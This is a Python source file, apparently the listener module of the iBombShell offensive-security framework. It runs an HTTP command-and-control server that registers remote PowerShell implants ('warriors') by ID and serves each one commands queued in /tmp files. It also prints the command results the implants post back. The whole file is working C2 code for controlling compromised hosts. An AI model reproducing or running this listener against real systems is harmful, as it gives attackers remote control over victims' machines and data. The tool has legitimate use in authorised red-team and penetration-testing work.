import re
import threading
from http.server import BaseHTTPRequestHandler, HTTPServer
from pathlib import Path
from urllib.parse import parse_qs, unquote

from termcolor import colored, cprint

from module import Module


class Listener(BaseHTTPRequestHandler):
    def log_message(self, format, *args):
        return

    def _set_response(self):
        self.send_response(200)
        self.send_header('Content-type', 'text/html')
        self.end_headers()

    def do_GET(self):
        ipSrc = self.client_address[0]
        regex = re.findall(r'^(.+)/([^/]+)$', self.path)
        route = ''
        try:
            route = regex[0][0]
            routeId = regex[0][1]
        except Exception:
            cprint('\n[!] Error creating warrior...', 'red')

        a = ''
        if route == "/ibombshell":
            try:
                with open('/tmp/ibs-{}'.format(routeId), 'r') as f:
                    a = f.read()

                if a is not '':
                    cprint('\n[+] Warrior {} get iBombShell commands...'.format(routeId), 'green')
                    with open('/tmp/ibs-{}'.format(routeId), 'w') as f:
                        f.write('')
            except Exception:
                cprint('\n[!] Warrior {} don\'t found'.format(routeId), 'red')
        elif route == "/newibombshell":
            # TODO: Duplicate functions!! REVIEW...
            warrior_exist = False
            for p in Path("/tmp/").glob("ibs-*"):
                if str(p)[9:] == routeId:
                    warrior_exist = True
                    break

            if not warrior_exist:
                with open('/tmp/ibs-{}'.format(routeId), 'w') as f:
                    f.write('')
                
                a = 'OK'
                cprint ("\n[+] New warrior {} from {}".format(routeId, ipSrc), 'green')
            else:
                cprint ('\n[!] Warrior already exists!', 'red')
        
        self._set_response()
        #self.wfile.write("GET request for {}".format(self.path).encode('utf-8'))
        self.wfile.write(a.encode('utf-8'))

    def do_POST(self):
        content_length = int(self.headers['Content-Length']) # <--- Gets the size of data
        post_data = self.rfile.read(content_length) # <--- Gets the data itself

        self._set_response()
        self.wfile.write(''.encode('utf-8'))

        # results = post_data[8:].decode("utf-8")

        # TODO: UnicodeDecodeError, example command pwd
        fields = parse_qs(post_data)
        try:
            results = fields[b'results'][0].decode("unicode_escape")
        except:
            results = fields[b'results'][0].decode('utf-8')

        try:
            url = str(unquote(results))

            cprint ('\n' + url, 'yellow')
        except Exception:
            if results is not '':
                cprint ('\n' + results, 'yellow')
            else:
                cprint ('\n[!] Error reading results!', 'red')

        #self.wfile.write("POST request for {}".format(self.path).encode('utf-8'))


class CustomModule(Module):
    def __init__(self):

        information = {"Name": "iBombShell listener",
                       "Description": "Listener to connect PS ibombshell",
                       "Author": "@toolsprods"}

        # -----------name-----default_value--description--required?
        options = {"port": ["8080", "Listener port", True],
                   "interface": ["0.0.0.0", "Listener address", True],
                   "src": ["/ibombshell", "Resource to get", False]}

        # Constructor of the parent class
        super(CustomModule, self).__init__(information, options)

    # This module must be always implemented, it is called by the run option
    def run_module(self):
        try:
            listener = threading.Thread(target=self.run, kwargs={'address':self.args["interface"], 'port':int(self.args["port"])})
            listener.start()
        except:
            print("The listener already exists ...")

    def run(self, server_class=HTTPServer, handler_class=Listener, address=None, port=8080): 
        server_address = (address, port)
        httpd = server_class(server_address, handler_class)
        print('Starting listener on {}:{}...\n'.format(address, port))
        try:
            httpd.serve_forever()
        except KeyboardInterrupt:
            pass
        httpd.server_close()
        print('Stopping listener...\n')
